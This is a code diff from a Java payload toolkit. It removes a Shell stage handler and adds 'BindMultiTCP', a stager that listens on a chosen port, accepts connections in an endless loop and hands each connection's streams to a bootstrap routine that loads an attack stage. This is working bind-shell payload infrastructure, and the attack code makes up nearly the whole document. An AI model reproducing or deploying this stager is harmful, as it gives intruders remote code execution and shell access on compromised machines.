@@ -32,14 +32,35 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.handler.stage;
+package javapayload.stager;
 
-public class Shell extends StageHandler {
-	public Class[] getNeededClasses() {
-		return new Class[] { javapayload.stage.Stage.class, javapayload.stage.StreamForwarder.class, javapayload.stage.Shell.class };
+import java.net.ServerSocket;
+import java.net.Socket;
+
+public class BindMultiTCP extends Stager implements Runnable {
+
+	private Socket s;
+	private String[] parameters; 
+	
+	private Runnable init(Socket s, String[] parameters) {
+		this.s = s;
+		this.parameters=parameters;	
+		return this;
 	}
 	
-	protected StageHandler createClone() {
-		return new Shell();
+	public void bootstrap(String[] parameters) throws Exception {
+		final ServerSocket ss = new ServerSocket(Integer.parseInt(parameters[2]));
+		while (true) {
+			final Socket s = ss.accept();
+			new Thread(new BindMultiTCP().init(s, parameters)).start();
+		}
+	}
+	
+	public void run() {
+		try {
+			bootstrap(s.getInputStream(), s.getOutputStream(), parameters);
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
 	}
 }
